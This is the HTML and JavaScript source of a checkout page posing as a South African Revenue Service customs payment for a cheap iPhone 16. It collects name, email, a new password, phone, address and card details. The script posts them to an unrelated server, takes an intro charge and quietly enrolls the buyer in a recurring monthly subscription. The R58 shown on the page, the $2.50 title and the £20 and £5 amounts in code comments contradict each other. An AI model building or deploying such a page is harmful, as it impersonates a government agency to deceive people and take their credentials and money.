<!DOCTYPE html>

<html lang="en">
<head>
<!-- Google tag (gtag.js) -->
<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-FDQ6REQWS8"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-FDQ6REQWS8');
  </script>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1, viewport-fit=cover" name="viewport"/>
<title>Secure Payment ‚Ä¢ SARS-style Checkout</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;2.50;700;800;900&amp;display=swap" rel="stylesheet"/>
<style>
    :root{
      --bg:#ffffff; --card:#f8f9fc; --text:#111; --muted:#555; --line:#ddd; --cta1:#ffd76b; --cta2:#ffb429; --radius:16px;
    }
    *{box-sizing:border-box}
    body{
      margin:0; font-family:Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif; 
      background:var(--bg); color:var(--text);
      display:flex; flex-direction:column; align-items:center; justify-content:flex-start;
      padding:18px 14px 40px;
    }
    .shell{ width:min(900px,100%); display:flex; flex-direction:column; gap:18px }
    .card{
      width:min(700px,100%); background:var(--card); border:1px solid var(--line);
      border-radius:var(--radius); padding:24px; box-shadow:0 8px 20px rgba(0,0,0,.05); margin-inline:auto;
    }
    .title{ font-size:28px; font-weight:900; text-align:center; margin:4px 0 14px }
    .sub{ text-align:center; color:var(--muted); margin-top:-6px; margin-bottom:16px }
    .img-wrap{ display:flex; justify-content:center; padding:10px 0 16px }
    .img-wrap img{ width:min(360px,80%); height:auto; border-radius:18px; border:1px solid #eee; }
    .grid{ display:grid; grid-template-columns:1fr 1fr; gap:12px }
    .input{ width:100%; padding:12px; border:1px solid #ccc; background:#fff; color:#111; border-radius:10px; font-size:16px; }
    .btn{
      width:100%; border:none; color:#111; border-radius:12px; padding:12px 16px;
      font-weight:900; cursor:pointer; font-size:16px; 
      background:linear-gradient(180deg,var(--cta1),var(--cta2));
      box-shadow:0 8px 18px rgba(255,174,15,.25);
    }
    .btn-row{ display:flex; gap:12px; margin-top:12px }
    .muted-btn{ background:#eee; color:#333; border:1px solid #ddd; }
    .step{ display:none }
    .step[aria-hidden="false"]{ display:block }
    .label{font-weight:700; margin:4px 0 8px; font-size:14px; color:#333}
    .el{ width:100%; background:#fff; color:#111; border:1px solid #ccc; border-radius:10px; padding:12px; }
    .brands{display:flex; justify-content:center; gap:12px; margin:14px 0 6px}
    .brands img{height:22px}
    .trust-text{ font-size:13px; color:#666; text-align:center; margin-top:12px }
    #err{ width:100%; margin-top:10px; font-size:14px; color:#b00020; background:#fde9eb; border:1px solid #e5b2b8; border-radius:10px; padding:8px; display:none; }
    #err[aria-hidden="false"]{ display:block; }
    .loading-overlay{ position:fixed; inset:0; background:rgba(255,255,255,.9); display:none; align-items:center; justify-content:center; flex-direction:column; z-index:9999; text-align:center; }
    .loading-overlay[aria-hidden="false"]{ display:flex }
    .loading-box{ width:min(92vw,460px); background:#fff; border:1px solid #ddd; border-radius:14px; box-shadow:0 6px 18px rgba(0,0,0,.08); padding:20px; text-align:center; }
    .loading-title{ font-weight:800; margin:2px 0 10px; color:#111 }
    .progress-wrap{ width:100%; height:10px; background:#eee; border-radius:999px; overflow:hidden; }
    .progress-bar{ width:0%; height:100%; background:linear-gradient(90deg, var(--cta1), var(--cta2)); animation: loadingBar 2.2s ease-in-out infinite; }
    @keyframes loadingBar{ 0%{width:0%} 60%{width:80%} 100%{width:100%} }

    /* Phone prefix + number layout */
    .phone-wrap{ display:grid; grid-template-columns:140px 1fr; gap:8px; }
    @media (max-width:520px){
      .phone-wrap{ grid-template-columns:1fr; }
    }
  

    :root{
      --sars-blue:#0B5E8E;
      --sars-blue-2:#0B6EA8;
      --sars-dark:#2b2b2b;
      --sars-white:#ffffff;
      --bg:#f7f9fb;
      --card:#ffffff;
      --text:#0b2239;
      --muted:#2e475d;
      --line:#d7e1ea;
      --cta1:var(--sars-blue-2);
      --cta2:var(--sars-blue);
      --radius:16px;
    }
    body{
      background:var(--bg);
    }
    /* Top dark bar (like SARS) */
    .topbar{background:var(--sars-dark); color:#fff; padding:10px 14px; font-size:14px}
    /* Blue hero with centered logo */
    .sars-hero{background:var(--sars-blue); padding:24px 12px; display:flex; align-items:center; justify-content:center; position:relative; box-shadow:inset 0 -1px 0 rgba(255,255,255,.1)}
    .sars-hero img{height:56px; object-fit:contain; filter: drop-shadow(0 1px 0 rgba(0,0,0,.15));}
    /* Card + inputs tweak for SARS look */
    .card{ border-color:#c6d6e2 }
    .title{ color:#0b2239 }
    .sub{ color:#38556d }
    .input, .el{ border-color:#c2d3df }
    .btn{ color:#fff; background:linear-gradient(180deg,var(--sars-blue-2),var(--sars-blue)); box-shadow:0 8px 20px rgba(11,110,168,.25) }
    .muted-btn{ background:#e9f1f7; color:#0b2239; border-color:#c6d6e2 }
    .brands img{filter:grayscale(0.2)}
    .loading-box .progress-bar{ background:linear-gradient(90deg,var(--sars-blue-2),var(--sars-blue)) }
    

/* ====== SARS-look refresh ====== */
:root{
  --sars-blue:#0B5E8E;         /* primary blue from screenshot */
  --sars-blue-2:#0B6EA8;       /* lighter edge for gradients */
  --sars-dark:#2b2b2b;         /* dark top bar */
  --sars-white:#ffffff;
  --card:#ffffff;
  --line:#cfe0ea;
  --radius:18px;
}

/* Make the whole background SARS blue */
html, body{
  background: var(--sars-blue) !important;
  color: #0b2239;
  min-height:100%;
}

/* Top bar like the site header */
.topbar{
  background: var(--sars-dark);
  color:#fff;
  padding:12px 18px;
  font-weight:600;
  letter-spacing:.2px;
}

/* Hero strip: lighter blue band with centered logo */
.sars-hero{
  background: linear-gradient(180deg, var(--sars-blue-2), var(--sars-blue));
  padding:28px 12px;
  display:flex;
  align-items:center;
  justify-content:center;
  box-shadow:inset 0 -1px 0 rgba(255,255,255,.2);
}
.sars-hero img{
  height:64px;
  object-fit:contain;
  filter: drop-shadow(0 1px 0 rgba(0,0,0,.2));
}

/* Main wrapper spacing so the card floats on the blue bg */
main, .container, .page, .root{
  max-width:960px;
  margin:24px auto 56px auto;
  padding:0 16px;
}

/* Card vibes */
.card, .panel, .box, .checkout{
  background: var(--card);
  border:1px solid var(--line) !important;
  border-radius: var(--radius);
  box-shadow: 0 12px 30px rgba(0,0,0,.12);
}

/* Headings & subtle sub copy */
h1,h2,h3,.title{ color:#123b56 }
.sub, .muted{ color:#3c5a6f }

/* Inputs */
input, select, textarea, .input, .el{
  background:#fff;
  border:1px solid #c7d8e4 !important;
  border-radius:12px !important;
  padding:12px 14px !important;
}
input:focus, select:focus, textarea:focus, .input:focus, .el:focus{
  outline: none;
  border-color:#86b7d7 !important;
  box-shadow: 0 0 0 3px rgba(134,183,215,.35);
}

/* Primary button in SARS gradient */
button, .btn, .pay{
  color:#fff !important;
  background: linear-gradient(180deg, var(--sars-blue-2), var(--sars-blue)) !important;
  border:0 !important;
  border-radius:14px !important;
  padding:12px 16px !important;
  font-weight:700 !important;
  box-shadow: 0 8px 22px rgba(11,110,168,.35);
  transition: transform .06s ease;
}
button:hover, .btn:hover, .pay:hover{ transform: translateY(-1px) }
button:active, .btn:active, .pay:active{ transform: translateY(0) }

/* Secondary/ghost button */
.muted-btn{
  background:#e7f1f7 !important;
  color:#0b2239 !important;
  border:1px solid #c7d8e4 !important;
}

/* Little SARS-style breadcrumb bar above the card */
.breadcrumbs{
  color:#eaf3f9;
  font-size:14px;
  margin:8px auto -8px auto;
  max-width:960px;
  padding:0 16px;
}
.breadcrumbs a{ color:#ffffff; opacity:.9; text-decoration:none }
.breadcrumbs span{ opacity:.8 }

/* Loading/progress */
.loading-box .progress-bar{
  background: linear-gradient(90deg, var(--sars-blue-2), var(--sars-blue)) !important;
}

/* Make any footer match */
.footer, footer{
  color:#eaf3f9;
  text-align:center;
  padding:24px 16px;
}
</style>
</head>
<body><div class="topbar">South African Revenue Service ‚Äî Secure Checkout</div><div class="sars-hero"><img alt="SARS-styled Logo" src="sars.png"/></div><div class="breadcrumbs">Home  ¬ª  Customs and Excise  ¬ª  Goods Declaration</div>
<!-- GoAffPro loader (keep this so the next page can track) -->
<script src="https://api.goaffpro.com/loader.js?shop=nzyvwvfbde" type="text/javascript"></script>
<div class="shell">
<!-- STEP 1 -->
<section aria-hidden="false" class="card step" id="step1">
<h1 class="title">
        Customs clearance for iPhone 16: <span data-price="" id="priceHero"> R58</span>!
      </h1>
<p class="sub">Limited-time offer. Secure your new iPhone today!</p>
<div class="img-wrap">
<img alt="iPhone 16 Plus" src="ipn16.png"/>
</div>
<div class="grid">
<input autocomplete="name" class="input" id="nameInput" placeholder="Full name" required=""/>
<input autocomplete="email" class="input" id="emailInput" placeholder="you@example.com" required="" type="email"/>
<!-- Password (left) + Phone (right) -->
<input autocomplete="new-password" class="input" id="passwordInput" placeholder="Create a password" required="" type="password"/>
<div class="phone-wrap">
<select aria-label="Country calling code" class="input" id="phonePrefix"></select>
<input autocomplete="tel-national" class="input" id="phoneNumber" inputmode="tel" placeholder="Phone number"/>
</div>
</div>
<div class="btn-row">
<button class="btn" id="nextBtn">Next step ‚Üí</button>
</div>
<p class="trust-text">We‚Äôll never share your email. 100% privacy guaranteed.</p>
</section>
<!-- STEP 2 -->
<section aria-hidden="true" class="card step" id="step2">
<h2 class="title">Secure Payment</h2>
<p class="sub">Your details are safe ‚Äî powered by Stripe.</p>
<!-- NEW: Billing address -->
<div class="label">Street address</div>
<input autocomplete="address-line1" class="input" id="billingStreet" placeholder="Street address"/>
<div class="grid" style="margin-top:10px">
<div>
<div class="label">City</div>
<input autocomplete="address-level2" class="input" id="billingCity" placeholder="City"/>
</div>
<div>
<div class="label">Post Code</div>
<input autocomplete="postal-code" class="input" id="billingPostcode" placeholder="Post Code"/>
</div>
</div>
<div class="label" style="margin-top:10px">Country</div>
<select autocomplete="country" class="input" id="billingCountry"></select>
<div id="gpay-button" style="margin-top:8px"></div>
<div class="label">Card number</div>
<div class="el" id="card-number"></div>
<div style="display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-top:10px">
<div>
<div class="label">Expiration</div>
<div class="el" id="card-expiry"></div>
</div>
<div>
<div class="label">CVC</div>
<div class="el" id="card-cvc"></div>
</div>
</div>
<div aria-hidden="true" id="err" role="alert"></div>
<div class="btn-row">
<button class="btn muted-btn" id="backBtn">‚Üê Back</button>
<button class="btn" id="payNow">Pay <span data-price="" id="priceButton">R58</span> Securely</button>
</div>
<div class="brands">
<img alt="Visa" src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg"/>
<img alt="Mastercard" src="https://charmr.xyz/logos/mc2.png"/>
<img alt="Amex" src="https://charmr.xyz/logos/amex.png"/>
<img alt="Google Pay" src="https://www.gstatic.com/instantbuy/svg/dark_gpay.svg"/>
</div>
<p class="trust-text">üîí 256-bit SSL Secured ¬∑ Powered by Stripe ¬∑ 30-Day Money Back Guarantee</p>
</section>
</div>
<!-- Loading overlay -->
<div aria-hidden="true" class="loading-overlay" id="loading-overlay">
<div class="loading-box">
<div class="loading-title">Processing your payment‚Ä¶</div>
<div class="progress-wrap"><div class="progress-bar"></div></div>
<p class="sub">Please wait, this may take a few seconds.</p>
</div>
</div>
<!-- Stripe.js -->
<script src="https://js.stripe.com/v3"></script>
<script>
    /* ---------- Step navigation ---------- */

    /* NEW: API base for local file testing */
    const API_BASE = (() => {
      if (location.protocol.startsWith('http')) return location.origin;
      return "http://localhost:10000"; // change if your dev server runs elsewhere
    })();

    const step1=document.getElementById('step1'),step2=document.getElementById('step2');
    const nameInput=document.getElementById('nameInput');
    const emailInput=document.getElementById('emailInput');
    const passwordInput=document.getElementById('passwordInput');
    // NEW phone inputs
    const phonePrefix=document.getElementById('phonePrefix');
    const phoneNumber=document.getElementById('phoneNumber');

    // NEW: billing address refs
    const billingStreet   = document.getElementById('billingStreet');
    const billingCity     = document.getElementById('billingCity');
    const billingPostcode = document.getElementById('billingPostcode');
    const billingCountry  = document.getElementById('billingCountry');

    // Create/confirm account on your Render server before moving to payment
    async function ensureAccount(){
      const email=(emailInput.value||'').trim();
      const password=passwordInput.value||'';
      const rawPhone=(phoneNumber?.value||'').replace(/[^\d]/g,'');
      const prefix=(phonePrefix?.value||'+1').trim();
      const phone = rawPhone ? `${prefix}${rawPhone}` : '';
      if(!email || !password) throw new Error("Please enter email and password.");
      const res=await fetch(`${API_BASE}/api/register`,{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({email,password,phone})
      });
      if(res.status===201) return true;
      let data={}; try{ data=await res.json(); }catch{}
      if(res.status===400 && /exists/i.test(data?.error||"")) return true;
      throw new Error(data?.error||"Could not create account");
    }

    document.getElementById('nextBtn').onclick=async()=>{ 
      if(!nameInput.value||!emailInput.value||!passwordInput.value){alert("Please enter your details");return}
      try{
        await ensureAccount();
      }catch(e){
        alert(e.message||"Problem creating your account. Please try again.");
        return;
      }
      localStorage.setItem("checkout_name",nameInput.value);
      localStorage.setItem("checkout_email",emailInput.value);
      step1.setAttribute("aria-hidden","true");
      step2.setAttribute("aria-hidden","false");
    };
    document.getElementById('backBtn').onclick=()=>{ 
      step1.setAttribute("aria-hidden","false");step2.setAttribute("aria-hidden","true");
    };

    /* ---------- Calling code data + helper for phone prefix ---------- */
    const CALLING_CODES = {
      US: { code: '+1',  name: 'United States' },
      CA: { code: '+1',  name: 'Canada' },
      GB: { code: '+44', name: 'United Kingdom' },
      IE: { code: '+353',name: 'Ireland' },
      AU: { code: '+61', name: 'Australia' },
      NZ: { code: '+64', name: 'New Zealand' },
      DE: { code: '+49', name: 'Germany' },
      FR: { code: '+33', name: 'France' },
      ES: { code: '+34', name: 'Spain' },
      IT: { code: '+39', name: 'Italy' },
      NL: { code: '+31', name: 'Netherlands' },
      SE: { code: '+46', name: 'Sweden' },
      NO: { code: '+47', name: 'Norway' },
      DK: { code: '+45', name: 'Denmark' },
      FI: { code: '+358',name: 'Finland' },
      BE: { code: '+32', name: 'Belgium' },
      AT: { code: '+43', name: 'Austria' },
      CH: { code: '+41', name: 'Switzerland' },
      PT: { code: '+351',name: 'Portugal' },
      PL: { code: '+48', name: 'Poland' },
      RO: { code: '+40', name: 'Romania' },
      CZ: { code: '+420',name: 'Czechia' },
      SK: { code: '+421',name: 'Slovakia' },
      HU: { code: '+36', name: 'Hungary' },
      GR: { code: '+30', name: 'Greece' }
    };
    function buildPrefixOptions(selectEl, prefer) {
      if(!selectEl) return;
      selectEl.innerHTML = "";
      const entries = Object.entries(CALLING_CODES);
      if (prefer && CALLING_CODES[prefer]) {
        const data = CALLING_CODES[prefer];
        selectEl.append(new Option(`${data.code} ‚Äî ${data.name}`, data.code, true, true));
      }
      const seen = new Set([prefer ? CALLING_CODES[prefer]?.code : '']);
      for (const [cc, data] of entries) {
        if (prefer === cc) continue;
        const key = `${data.code}|${data.name}`;
        if (seen.has(key)) continue;
        selectEl.append(new Option(`${data.code} ‚Äî ${data.name}`, data.code));
        seen.add(key);
      }
      if (!selectEl.value) selectEl.value = '+1';
    }

    /* ---------- Currency & geo by IP (display + prefill) ---------- */
    (function setCurrencyByIP(){
      const EU = new Set([
        'AT','BE','BG','HR','CY','CZ','DK','EE','FI','FR','DE','GR','HU','IE','IT',
        'LV','LT','LU','MT','NL','PL','PT','RO','SK','SI','ES','SE'
      ]);
      function symbolFor(cc){
        if(cc==='US') return '$';
        if(cc==='GB' || cc==='UK') return '¬£';
        if(EU.has(cc)) return '‚Ç¨';
        return '$';
      }
      function applyPriceSymbol(symbol){
        document.querySelectorAll('[data-price]').forEach(el=>{
          el.textContent = `R58`;
        });
        document.title = `Get The iPhone 16 Plus for ${symbol}2.50!`;
      }

      // Seed immediate fallbacks
      applyPriceSymbol('$');
      try { buildPrefixOptions(phonePrefix, 'US'); } catch {}

      // Helper: fill country select with a single focused option + common fallbacks
      function initCountrySelect(code, name) {
        if (!billingCountry) return;
        const opts = [];
        function add(value, label, selected=false){
          const o = new Option(label, value, selected, selected);
          opts.push(o);
        }
        // Primary detected country first
        if (code) add(code.toUpperCase(), `${name || code.toUpperCase()}`, true);
        // A few commons as alternates
        [['US','United States'],['GB','United Kingdom'],['IE','Ireland'],['DE','Germany'],['FR','France'],['ES','Spain'],['IT','Italy'],['NL','Netherlands'],['AU','Australia'],['CA','Canada']].forEach(([c,n])=>{
          if (!code || c.toUpperCase()!==code.toUpperCase()) add(c, n, false);
        });
        billingCountry.innerHTML='';
        opts.forEach(o=>billingCountry.appendChild(o));
      }

      fetch('https://ipapi.co/json/')
        .then(r => r.ok ? r.json() : Promise.reject())
        .then(data => {
          const cc = ((data && (data.country || data.country_code)) || 'US').toUpperCase();
          applyPriceSymbol(symbolFor(cc));

          // Prefer the exact calling code returned by the API (covers countries not in your static list)
          const apiCalling = (data && data.country_calling_code) || '';
          const apiName    = (data && data.country_name) || '';
          const city       = (data && data.city) || '';
          if (apiCalling) {
            try {
              phonePrefix.innerHTML = '';
              phonePrefix.append(new Option(`${apiCalling} ‚Äî ${apiName || 'Your country'}`, apiCalling, true, true));
              const seen = new Set([apiCalling]);
              for (const [, info] of Object.entries(CALLING_CODES)) {
                if (seen.has(info.code)) continue;
                phonePrefix.append(new Option(`${info.code} ‚Äî ${info.name}`, info.code));
                seen.add(info.code);
              }
            } catch {}
          } else {
            try { buildPrefixOptions(phonePrefix, cc); } catch {}
          }

          // NEW: prefill address Country/City
          try { initCountrySelect(cc, apiName); } catch {}
          try { if (city && !billingCity.value) billingCity.value = city; } catch {}
        })
        .catch(() => {
          try {
            const loc = Intl.DateTimeFormat().resolvedOptions().locale || 'en-US';
            const cc = (loc.split('-')[1] || 'US').toUpperCase();
            applyPriceSymbol(symbolFor(cc));
            try { buildPrefixOptions(phonePrefix, cc); } catch {}
            try { initCountrySelect(cc, cc); } catch {}
          } catch { /* keep defaults */ }
        });
    })();

    /* ---------- PREFILL from URL (email & phone) ---------- */
    (function prefillFromQuery(){
      try{
        const qs = new URLSearchParams(location.search);

        // Email via ?email= / ?e= / ?em= / ?mail=
        const emailParam = qs.get('email') || qs.get('e') || qs.get('em') || qs.get('mail');
        if (emailParam && emailInput) {
          emailInput.value = decodeURIComponent(emailParam).trim();
        }

        // Phone can be: ?phone=+441234567890  OR split as ?prefix=%2B44&number=1234567890
        const prefixParam = qs.get('prefix') || qs.get('cc') || qs.get('dial');
        const numberParam = qs.get('number') || qs.get('n');
        const phoneParam  = qs.get('phone')  || qs.get('tel')  || qs.get('p') || qs.get('msisdn');

        let desiredPrefix = null;
        let desiredNumber = null;

        // If a single phone is provided, try to split E.164 (+CCxxxxxxxxx)
        if (phoneParam) {
          let p = (phoneParam + '').replace(/[^\d+]/g,'');
          if (p.startsWith('+')) {
            const codes = Array.from(new Set(Object.values(CALLING_CODES).map(x=>x.code))).sort((a,b)=>b.length-a.length);
            const hit = codes.find(code => p.startsWith(code));
            if (hit) { desiredPrefix = hit; desiredNumber = p.slice(hit.length); }
            else { desiredPrefix = '+1'; desiredNumber = p.replace(/^\+\d{1,3}/,''); }
          } else {
            // No +, treat as national number, leave prefix for explicit param or default later
            desiredNumber = p;
          }
        }
        if (numberParam) desiredNumber = (numberParam + '').replace(/[^\d]/g,'');
        if (prefixParam) {
          const cleaned = (prefixParam + '').replace(/[^\d+]/g,'');
          desiredPrefix = cleaned.startsWith('+') ? cleaned : ('+' + cleaned);
        }

        // Apply number immediately
        if (desiredNumber && phoneNumber) phoneNumber.value = desiredNumber;

        // Apply prefix even if options aren't populated yet (retry a few times)
        function applyPrefix(){
          if (!desiredPrefix || !phonePrefix) return true;
          // Ensure the option exists; if not, create one so value sticks
          const exists = Array.from(phonePrefix.options).some(o => o.value === desiredPrefix);
          if (!exists) {
            phonePrefix.insertBefore(new Option(`${desiredPrefix} ‚Äî Your country`, desiredPrefix, true, true), phonePrefix.firstChild);
          }
          phonePrefix.value = desiredPrefix;
          return phonePrefix.value === desiredPrefix;
        }
        if (!applyPrefix()){
          let tries = 0;
          const t = setInterval(() => {
            tries++;
            if (applyPrefix() || tries > 20) clearInterval(t);
          }, 150);
        }
      }catch{/* ignore */}
    })();

    /* ---------- Stripe logic (now: straight to subscription) ---------- */
    const SUBSCRIBE_URL="https://charmr-jfmc.onrender.com/api/stripe/intro-charge-20";
    const PUBLISHABLE_KEY="pk_live_51Rhm4sEJXIhiKzYGIPVjXwZTzuKmqU7EOA6EpDIkrNTmtm4ooWHbDcSaBlyglSdJYhCyU4VgcI8Qo09Acc8upCUD00ekSRuN4q";
    const FIXED_PRICE_ID="price_1Rzdp0EJXIhiKzYGlVxHGH7W";
    const stripe=Stripe(PUBLISHABLE_KEY),elements=stripe.elements();
    const cardNumber=elements.create("cardNumber"),cardExpiry=elements.create("cardExpiry"),cardCvc=elements.create("cardCvc");
    cardNumber.mount("#card-number");cardExpiry.mount("#card-expiry");cardCvc.mount("#card-cvc");
    const $err=document.getElementById("err"),overlay=document.getElementById("loading-overlay");
    function showError(m){$err.textContent=m;$err.style.display="block"}
    function hideError(){$err.textContent="";$err.style.display="none"}
    function showLoading(){overlay.setAttribute("aria-hidden","false")}
    function hideLoading(){overlay.setAttribute("aria-hidden","true")}

    // NEW: monthly price id for ¬£5/30 days after the 30-day trial
    const MONTHLY_PRICE_ID = "price_1RvJmqEJXIhiKzYGE0IJQp7t";

    document.getElementById("payNow").onclick=async()=>{
      hideError();showLoading();

      // Build phone from prefix + digits only
      const rawPhone=(phoneNumber?.value||'').replace(/[^\d]/g,'');
      const prefix=(phonePrefix?.value||'+1').trim();
      const fullPhone = rawPhone ? `${prefix}${rawPhone}` : undefined;

      // Collect billing address for Stripe billing_details.address
      const addr = {
        line1: (billingStreet?.value || '').trim() || undefined,
        city: (billingCity?.value || '').trim() || undefined,
        postal_code: (billingPostcode?.value || '').trim() || undefined,
        country: (billingCountry?.value || '').trim() || undefined, // ISO 2-letter
      };

      const pm=await stripe.createPaymentMethod({
        type:"card",
        card:cardNumber,
        billing_details:{
          name:nameInput.value || undefined,
          email:emailInput.value || undefined,
          phone: fullPhone,
          address: addr
        }
      });

      if(pm.error){hideLoading();showError(pm.error.message);return}

      try{
        // 1) Create the ¬£20 intro charge PaymentIntent
        const res=await fetch(SUBSCRIBE_URL,{
          method:"POST",
          headers:{"Content-Type":"application/json"},
          body:JSON.stringify({
            paymentMethodId:pm.paymentMethod.id,
            name:nameInput.value,
            email:emailInput.value,
            phone: fullPhone,
            address: addr
          })
        });
        const data=await res.json();
        if(data.error){hideLoading();showError(data.error);return}
        if(!data.clientSecret){hideLoading();showError("Payment failed");return}

        // 2) Confirm the intro charge (handles SCA/3DS)
        const conf=await stripe.confirmCardPayment(data.clientSecret);
        if(conf.error){hideLoading();showError(conf.error.message);return}
        if(!(conf.paymentIntent&&conf.paymentIntent.status==="succeeded")){hideLoading();showError("Payment not completed");return}

        // 3) Start the subscription using the successful intro charge
        const subRes = await fetch("https://charmr-jfmc.onrender.com/api/stripe/start-monthly-after-trial",{
          method:"POST",
          headers:{"Content-Type":"application/json"},
          body:JSON.stringify({
            paymentIntentId: data.paymentIntentId,
            priceIdMonthly: MONTHLY_PRICE_ID
          })
        });
        const subData = await subRes.json();
        if(subData.error){hideLoading();showError(subData.error);return}

        // Success: 60% B to thankyou-iphone-skip.html, 40% a to thankyou-iphone.html
        (function(){
          const A = 'thankyou-iphone.html';
          const B = 'thankyou-iphone-skip.html';
          const pid = (conf && conf.paymentIntent && conf.paymentIntent.id) || data.paymentIntentId || '';

          // FNV-1a 32-bit (returns unsigned int)
          function fnv1a32(str){
            let h = 0x811c9dc5 >>> 0;
            for (let i = 0; i < str.length; i++){
              h ^= str.charCodeAt(i);
              h = Math.imul(h, 0x01000193) >>> 0;
            }
            return h >>> 0;
          }
          // Crypto-safe random int [0, maxExclusive)
          function cryptoRandInt(max){
            try{
              const u32 = new Uint32Array(1);
              crypto.getRandomValues(u32);
              return Number(u32[0] % BigInt(max));
            }catch{ return Math.floor(Math.random()*max); }
          }

          // Deterministic 60/40 bucket from pid (or crypto fallback)
          const bucket = pid ? (fnv1a32(pid) % 100) : cryptoRandInt(100);
          const goSkip = bucket < 60; // 60% to thankyou-iphone-skip.html

          // Optional cache-buster using pid/timestamp (doesn't affect split)
          const qb = pid ? ('?v=' + encodeURIComponent(pid)) : ('?t=' + Date.now());

          window.location.href = (goSkip ? B : A) + qb;
        })();

      }catch(e){
        hideLoading();showError(e.message||"Something went wrong");
      }
    };
  </script>
</body>
</html>
